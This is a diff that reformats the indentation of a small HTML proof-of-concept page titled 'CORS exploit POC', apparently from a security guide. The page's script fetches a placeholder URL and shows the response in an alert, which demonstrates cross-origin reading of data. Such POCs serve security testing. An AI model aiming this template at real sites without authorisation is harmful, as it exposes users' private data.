@@ -88,18 +88,18 @@ or
 
 ```html
 <!DOCTYPE html>
-    <html>
-        <head>
-            <title>CORS exploit POC</title>
-                <script type="text/javascript">
+<html>
+    <head>
+        <title>CORS exploit POC</title>
+            <script type="text/javascript">
 
-                    fetch('---URL HERE----')
-                        .then(response=> response.text())
-                        .then(myJson=> alert(myJson))
-                </script>
-        </head>
-        <body>
-        </body>
+                fetch('---URL HERE----')
+                    .then(response=> response.text())
+                    .then(myJson=> alert(myJson))
+            </script>
+    </head>
+    <body>
+    </body>
 </html>
 ```
 
